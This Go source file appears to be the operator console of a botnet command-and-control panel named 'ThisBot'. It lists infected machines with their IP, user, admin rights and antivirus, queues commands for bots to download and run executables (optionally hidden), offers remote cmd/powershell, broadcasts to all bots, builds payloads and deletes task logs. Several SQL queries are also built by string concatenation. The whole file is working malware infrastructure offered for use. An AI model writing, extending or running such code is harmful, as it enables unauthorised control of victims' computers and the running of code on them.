package core

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"database/sql"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func show_banner() {
	var banner string = "\n" + `___________.__    .__       __________        __ ` + "\n" +
		`\__    ___/|  |__ |__| _____\______   \ _____/  |_ ` + "\n" +
		`  |    |   |  |  \|  |/  ___/|    |  _//  _ \   __\` + "\n" +
		`  |    |   |   Y  \  |\___ \ |    |   (  <_> )  |  ` + "\n" +
		`  |____|   |___|  /__/____  >|______  /\____/|__|  ` + "\n" +
		`  	        \/        \/        \/             ` + common.Version + "\n" +
		"                                                   Author: Nec0Arc" + "\n"
	fmt.Println(banner)
}

func show_bot_info(bot *common.Client) {
	common.Mutex.Lock()
	defer common.Mutex.Unlock()
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	fmt.Println("⚔️ ⚔️ ⚔️  Currrent bot: ")
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	fmt.Printf("👣 ID: %d\n", bot.Id)
	fmt.Println("🏴 Guid: " + bot.Guid)
	fmt.Println("🌐 IP: " + bot.Ip)
	fmt.Println("👽 Who: " + bot.Whoami)
	fmt.Println("💻 OS: " + bot.Os)
	fmt.Println("📅 InstallDate: ", bot.Installdate)
	admin := "yes"
	if bot.Isadmin != admin {
		admin = "no"
	}
	fmt.Println("👽 Admin: " + admin)
	fmt.Println("😈 Anti-Virus: " + bot.Antivirus)
	fmt.Println("🤖 CPU: " + bot.Cpuinfo)
	fmt.Println("🎭 GPU: " + strings.TrimSpace(bot.Gpuinfo))
	fmt.Println("🔬 Lastseen: " + bot.Lastseen)
	fmt.Println("👾 Version: " + bot.Version)
	fmt.Println("🐾 --------------------------------------------------- 🐾")
}

func help_handler() {
	fmt.Println("1. help/h: Show help menu")
	fmt.Println("2. exec [-h] path/url [args]: Execute executable file or download from host and execute, option -h decides if hidden execute")
	fmt.Println("3. cmd/pws: Remote cmd or powershell")
	fmt.Println("4. list: Show all bots")
	fmt.Println("5. info id: Show bot info which ID is id")
	fmt.Println("6. select botid: Select a connected bot to operate")
	fmt.Println("7. clear: Clean the screen")
	fmt.Println("8. mode [broadcast]: Show current mode or switch to broadcast")
	fmt.Println("9. log command: \n  log list: it will show all task logs\n  log del [all/n]: it will delete all records or specific one\n  log export [filename]: If only use 'log export' will generate a .csv file with a timestamp name, or you can specify your own.")
	fmt.Println("10. cancel [task_id/all]: if option is all means cancel all tasks, or just task specfied by taskid")
}

func cancel_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[-] Usage: cancel [task_id/all], please enter help command")
		return
	}
	option := strings.TrimSpace(strings.ToLower(ary[1]))

	if option == "all" {
		sqlStr := "update tasks t join logs l on l.task_id = t.id set t.status='canceled' " +
			"where l.account_id=? and (instr(t.status, 'queued') or instr(t.status, 'running'))"
		rows, err := db1.Exec(common.Db, sqlStr, common.Account)
		if err != nil {
			fmt.Println("[-] Failed to cancel all tasks")
		} else if rows == 0 {
			fmt.Println("[-] No task needs to be canceled")
		} else {
			// Update all status in logs
			sqlStr = "update logs set status='canceled' where account_id=? and (instr(status, 'queued') or instr(status, 'running'))"
			_, err := db1.Exec(common.Db, sqlStr, common.Account)
			if err != nil {
				fmt.Println("[+] Cancel all tasks successfully but failed to update task logs")
				return
			}
			fmt.Println("[+] Cancel all tasks successfully")
		}
	} else {
		sqlStr := "update tasks t join logs l on l.task_id=t.id set t.status='canceled' " +
			"where l.account_id=? and l.task_id=? and (instr(t.status, 'queued') or instr(t.status, 'running'))"
		task_id, _ := strconv.ParseInt(option, 10, 64)
		rows, err := db1.Exec(common.Db, sqlStr, common.Account, task_id)
		if err != nil {
			fmt.Printf("[-] Failed to cancel task[%d]\n", task_id)
		} else if rows == 0 {
			fmt.Printf("[-] Task[%d] already done\n", task_id)
		} else {
			// Update logs table
			sqlStr = "update logs set status='canceled' where account_id=? and task_id=? or (instr(status, 'queued') or instr(status, 'running'))"
			_, err := db1.Exec(common.Db, sqlStr, common.Account, task_id)
			if err != nil {
				fmt.Printf("[+] Cancel task[%d] successfully but failed to update task log\n", task_id)
				return
			}
			fmt.Printf("[+] Cancel task[%d] successfully\n", task_id)
		}
	}
}

func select_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[-] Usage: select botid, please enter help command")
		return
	}
	// Check it's a number
	botid, err := strconv.ParseInt(ary[1], 10, 64)
	if err != nil || botid == 0 {
		fmt.Println("[-] You need to enter a bot id which is number")
		return
	}
	// Check if bot in database record
	var bot common.Client
	if !get_bot_info(botid, &bot) {
		fmt.Println("[-] Bot doesn't exist, please enter right bot id")
		return
	}
	// Switch mode
	common.CurrentBot = botid
	show_bot_info(&bot)
}

func exec_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[-] Usage: exec [-h] path/url [args], please enter help command")
		return
	}
	var options string = ""
	var hidden bool = false

	if ary[1] == "-h" {
		hidden = true
	}

	i := 1
	if hidden {
		i++
	}

	for ; i < len(ary); i++ {
		options += " " + ary[i]
	}
	options = strings.TrimSpace(options)
	// Complete the command
	if strings.ToLower(ary[0]) == "exec" {
		ary[0] = "execute"
	}
	// Query if there's command in database
	sqlStr := "select id from commands where name='" + ary[0] + "'"

	command_id := 0
	err := db1.QueryRow(common.Db, sqlStr).Scan(&command_id)
	if err != nil {
		if err == sql.ErrNoRows {
			fmt.Println("[-] No such command")

		} else {
			fmt.Println("[-] Command error")
		}
		return
	}

	sqlStr = "insert into tasks (bot_id, command_id, args, status) values (?,?,?,?)"
	map_args := map[string]interface{}{
		"args":   options,
		"hidden": hidden,
	}
	byt, _ := json.Marshal(map_args)
	_, err = db1.Insert(common.Db, sqlStr, common.CurrentBot, command_id, byt, "queued")
	if err != nil {
		fmt.Println("[-] Failed to generate command")
		return
	} else {
		fmt.Println("[+] Generate command okay")
	}
}

func info_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[-] Usage: info id, request latest bot information")
		return
	}
	botid, err := strconv.ParseInt(ary[1], 10, 64)
	if err != nil {
		fmt.Println("[-] You need to enter a bot id which is number")
		return
	}
	var bot common.Client
	if !get_bot_info(botid, &bot) {
		fmt.Println("[-] Bot doesn't exist, please enter right bot id")
		return
	}
	show_bot_info(&bot)
}

func get_bot_info(botid int64, bot *common.Client) bool {
	// Check if bot in database record
	sqlStr := "select guid, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where id='" + strconv.FormatInt(botid, 10) + "'"
	err := db1.QueryRow(common.Db, sqlStr).Scan(&bot.Guid, &bot.Ip, &bot.Whoami, &bot.Os, &bot.Installdate, &bot.Isadmin, &bot.Antivirus, &bot.Cpuinfo, &bot.Gpuinfo, &bot.Version, &bot.Lastseen)
	if err != nil {
		return false
	}

	bot.Id = int(botid)
	return true
}

func mode_handler(ary []string) {
	if len(ary) == 1 {
		if common.CurrentBot == 0 {
			fmt.Println("[+] Broadcast mode")
		} else {
			fmt.Println("[+] Current bot ID: " + strconv.FormatInt(common.CurrentBot, 10))
		}
	} else {
		if ary[1] == "broadcast" {
			common.CurrentBot = 0
			fmt.Println("[+] Switch to broadmode")
		} else {
			fmt.Println("[-] Failed to switch to broadcast mode")
		}
	}
}

func del_log(ary []string) {
	if len(ary) < 3 {
		fmt.Println("[-] Usage: log del [log_id/all], please enter right command")
		return
	}

	if ary[2] == "all" {
		sqlStr := "truncate table logs"
		_, err := db1.Exec(common.Db, sqlStr)
		if err != nil {
			fmt.Println("[-] Failed to delete logs")
			return
		}
		fmt.Println("[+] Delete logs successfully")
		return
	}

	id, err := strconv.ParseInt(ary[2], 10, 64)
	if err != nil {
		fmt.Println("[-] Please enter right task ID")
		return
	}
	sqlStr := "delete from logs where id=?"
	row, err := db1.Exec(common.Db, sqlStr, id)
	if err != nil {
		fmt.Printf("[-] Failed to delete log[%d]\n", id)
		return
	} else if row == 0 {
		fmt.Printf("[-] log[%d] doesn't exist\n", id)
		return
	}

	fmt.Printf("[+] log[%d] deleted okay\n", id)
}

func export_logs(ary []string) {
	sqlStr := "select id,account_id,task_id,client_id,action,message,status,created_at,ip from logs"
	rows, err := db1.QueryRows(common.Db, sqlStr)
	if err != nil {
		fmt.Println("[-] Error in exporting logs")
		return
	}

	// Create saving file
	fmtTime := ""
	if len(ary) < 3 {
		timestamp := utils.GenerateUtcTimestamp()
		t := time.UnixMilli(timestamp)
		fmtTime = t.Format("2006_01_02_15_04_05")
		fmtTime += "_logs.csv"
	} else {
		fmtTime = ary[2]
	}

	file, err := os.Create(fmtTime)
	if err != nil {
		fmt.Println("[-] Error in exporting logs")
		return
	}
	defer file.Close()

	// Create CVS writter
	writer := csv.NewWriter(file)
	defer writer.Flush()

	// Write headers to csv file
	err = writer.Write([]string{"ID", "AccountID", "TaskID", "BotID", "Action", "Message", "Status", "Create Time", "IP"})
	if err != nil {
		fmt.Println("[-] Error in exporting logs")
		return
	}
	saved_id := 0
	saved_account_id := 0
	saved_task_id := 0
	saved_bot_id := 0
	saved_action := ""
	saved_message := ""
	saved_status := ""
	saved_created_time := ""
	saved_ip := ""

	for rows.Next() {
		err = rows.Scan(&saved_id, &saved_account_id, &saved_task_id,
			&saved_bot_id, &saved_action,
			&saved_message, &saved_status, &saved_created_time, &saved_ip)
		if err != nil {
			continue
		}
		record := []string{fmt.Sprintf("%d", saved_id),
			fmt.Sprintf("%d", saved_account_id),
			fmt.Sprintf("%d", saved_task_id),
			fmt.Sprintf("%d", saved_bot_id),
			saved_action, saved_message, saved_status,
			saved_created_time, saved_ip,
		}
		err := writer.Write(record)
		if err != nil {
			continue
		}
	}

	fmt.Println("[+] Export to " + fmtTime)
}

func list_logs() {
	common.Mutex.Lock()
	defer common.Mutex.Unlock()

	sqlStr := `SELECT l.id, 
					l.action, 
					l.message, 
					l.created_at, 
					l.ip, 
					c.guid, 
					c.clientversion, 
					t.status
				FROM logs AS l
				JOIN clients AS c ON l.client_id = c.id
				JOIN tasks AS t ON l.task_id = t.id
				WHERE l.account_id = ?
				ORDER BY l.created_at DESC`

	res, err := db1.QueryRows(common.Db, sqlStr, common.Account)
	if err != nil {
		fmt.Println("[-] Failed to list logs")
		return
	}
	defer res.Close()

	saved_id := 0
	saved_action := ""
	saved_msg := ""
	saved_created_at := ""
	saved_ip := ""
	saved_guid := ""
	saved_clientversion := ""
	saved_status := ""

	fmt.Println("🐾 🐾 🐾 Logs list: ")
	for res.Next() {
		err = res.Scan(&saved_id, &saved_action, &saved_msg, &saved_created_at,
			&saved_ip, &saved_guid, &saved_clientversion, &saved_status)
		if err != nil {
			continue
		}
		saved_msg = strings.TrimSpace(saved_msg)
		if saved_msg == "" {
			saved_msg = "NaN"
		}

		fmt.Println("🐾 --------------------------------------------------- 🐾")
		fmt.Println("✅ ID: " + strconv.FormatInt(int64(saved_id), 10))
		fmt.Println("🔰 Guid:" + saved_guid)
		fmt.Println("🌍 IP: " + saved_ip)
		fmt.Println("⛏️ Action: " + saved_action)
		fmt.Println("💭 Message: " + saved_msg)
		fmt.Println("🌀 Status: " + saved_status)
	}
}

func log_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[-] Usage: log [list/del/export], please enter help command")
		return
	}

	switch ary[1] {
	case "list", "l":
		list_logs()
	case "del", "d":
		del_log(ary)
	case "export", "r":
		export_logs(ary)
	}
}

func list_handler() {
	sqlStr := "select id from clients"
	var bot common.Client
	var id int64
	rows, err := db1.QueryRows(common.Db, sqlStr)
	if err != nil {
		log.Println(err.Error())
		return
	}
	for rows.Next() {
		if rows.Scan(&id) != nil {
			fmt.Println("[-] Error in showing botid = " + strconv.FormatInt(id, 10))
			continue
		}
		if !get_bot_info(id, &bot) {
			fmt.Println("[-] Bot " + strconv.FormatInt(id, 10) + " doesn't exist, please enter right bot id")
			continue
		}
		show_bot_info(&bot)
		fmt.Println("")
	}
}

func clear_handler() {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("cmd")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func build_handler() {
	payload, path := BuildPayload()
	if nil == payload {
		fmt.Println("[-] Failed to build payload")
		return
	}
	if utils.WriteBinary(path, payload) {
		fmt.Println("[+] Successfully built payload, path: " + path)
	} else {
		fmt.Println("[-] Failed to build payload")
	}
}

func Panel() {
	// Default user is login and account id is 1
	common.Account = 1

	var command string = ""
	show_banner()
	for {
		fmt.Print("$ ")
		command = utils.ReadFromIO()
		if command == "" {
			continue
		}
		cmdAry := strings.Fields(command)

		switch cmdAry[0] {
		case "select", "s":
			select_handler(cmdAry)
		case "list", "l":
			list_handler()
		case "help", "h":
			help_handler()
		case "cancel", "c":
			cancel_handler(cmdAry)
		case "log":
			log_handler(cmdAry)
		case "exec":
			exec_handler(cmdAry)
		case "clear":
			clear_handler()
			show_banner()
		case "info":
			info_handler(cmdAry)
		case "mode":
			mode_handler(cmdAry)
		case "build":
			build_handler()
		}
	}
}
